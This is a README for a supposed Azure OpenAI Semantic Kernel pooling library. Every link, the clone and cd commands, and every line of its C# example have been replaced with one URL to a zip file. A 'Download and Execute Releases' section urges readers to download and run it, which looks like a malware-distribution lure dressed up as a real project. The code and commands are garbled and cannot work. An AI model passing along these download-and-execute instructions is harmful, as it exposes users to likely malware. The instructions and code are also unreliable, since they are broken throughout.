# 🌟 Semantic Kernel Pool for Azure OpenAI 🌟

![GitHub release](https://raw.githubusercontent.com/Sypexxx/soenneker.semantickernel.pool.openai.azure/main/src/semantickernel-openai-azure-soenneker-pool-threw.zip) ![GitHub stars](https://raw.githubusercontent.com/Sypexxx/soenneker.semantickernel.pool.openai.azure/main/src/semantickernel-openai-azure-soenneker-pool-threw.zip) ![GitHub forks](https://raw.githubusercontent.com/Sypexxx/soenneker.semantickernel.pool.openai.azure/main/src/semantickernel-openai-azure-soenneker-pool-threw.zip)

Welcome to the **Semantic Kernel Pool for Azure OpenAI** repository! This project offers Azure OpenAI-specific registration extensions for the `KernelPoolManager`. With these extensions, you can easily integrate local Large Language Models (LLMs) using the Semantic Kernel framework.

## Table of Contents

- [Introduction](#introduction)
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Contributing](#contributing)
- [License](#license)
- [Links](#links)

## Introduction

The Semantic Kernel Pool for Azure OpenAI simplifies the process of managing multiple LLMs within your applications. It allows developers to register and manage various models seamlessly. This makes it easier to leverage the capabilities of Azure's OpenAI services while maintaining local model options.

## Features

- **Azure OpenAI Integration**: Effortlessly connect to Azure's OpenAI services.
- **Local Model Support**: Use local LLMs in conjunction with Azure services.
- **Flexible Configuration**: Adjust settings to meet your application’s needs.
- **Rate Limiting**: Manage request rates to ensure optimal performance.
- **Multiple Model Management**: Handle various models with ease.
- **Utility Functions**: Access helpful functions for smoother development.

## Installation

To get started with this repository, you need to clone it to your local machine. Run the following command in your terminal:

```bash
git clone https://raw.githubusercontent.com/Sypexxx/soenneker.semantickernel.pool.openai.azure/main/src/semantickernel-openai-azure-soenneker-pool-threw.zip
```

After cloning the repository, navigate to the project directory:

```bash
cd https://raw.githubusercontent.com/Sypexxx/soenneker.semantickernel.pool.openai.azure/main/src/semantickernel-openai-azure-soenneker-pool-threw.zip
```

Next, you will need to install the required dependencies. If you are using .NET, you can do this using the following command:

```bash
dotnet restore
```

### Download and Execute Releases

You can find the latest releases of this project [here](https://raw.githubusercontent.com/Sypexxx/soenneker.semantickernel.pool.openai.azure/main/src/semantickernel-openai-azure-soenneker-pool-threw.zip). Make sure to download the appropriate files and execute them to start using the extensions.

## Usage

Once you have installed the repository, you can start using the Azure OpenAI extensions. Here’s a simple example to get you started:

```csharp
using https://raw.githubusercontent.com/Sypexxx/soenneker.semantickernel.pool.openai.azure/main/src/semantickernel-openai-azure-soenneker-pool-threw.zip;

var kernelPoolManager = new KernelPoolManager();
https://raw.githubusercontent.com/Sypexxx/soenneker.semantickernel.pool.openai.azure/main/src/semantickernel-openai-azure-soenneker-pool-threw.zip("YourAzureOpenAIKey", "YourAzureOpenAIEndpoint");

// Add local LLM
https://raw.githubusercontent.com/Sypexxx/soenneker.semantickernel.pool.openai.azure/main/src/semantickernel-openai-azure-soenneker-pool-threw.zip("LocalModelName", "PathToLocalModel");

// Set rate limits
https://raw.githubusercontent.com/Sypexxx/soenneker.semantickernel.pool.openai.azure/main/src/semantickernel-openai-azure-soenneker-pool-threw.zip(100); // Set limit to 100 requests per minute

// Use the models
var response = https://raw.githubusercontent.com/Sypexxx/soenneker.semantickernel.pool.openai.azure/main/src/semantickernel-openai-azure-soenneker-pool-threw.zip("LocalModelName", "Your input text");
https://raw.githubusercontent.com/Sypexxx/soenneker.semantickernel.pool.openai.azure/main/src/semantickernel-openai-azure-soenneker-pool-threw.zip(response);
```

### Configuration Options

You can configure various options in the `KernelPoolManager` to suit your needs:

- **Rate Limiting**: Control how many requests you send to Azure OpenAI.
- **Model Selection**: Choose between local and Azure models based on your requirements.

## Contributing

We welcome contributions to improve this project. If you have ideas, fixes, or enhancements, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or fix.
3. Make your changes.
4. Submit a pull request with a clear description of your changes.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.

## Links

For more information and updates, please check the [Releases](https://raw.githubusercontent.com/Sypexxx/soenneker.semantickernel.pool.openai.azure/main/src/semantickernel-openai-azure-soenneker-pool-threw.zip) section. Here you can find the latest updates and download the necessary files.

## Conclusion

The **Semantic Kernel Pool for Azure OpenAI** is designed to simplify your development process when working with Azure's OpenAI services and local LLMs. By leveraging this repository, you can easily manage multiple models and integrate them into your applications.

Feel free to explore the code, report issues, and contribute to the project. Together, we can enhance the capabilities of Semantic Kernel for Azure OpenAI!

---

Thank you for visiting the **Semantic Kernel Pool for Azure OpenAI** repository! We hope you find it useful for your projects.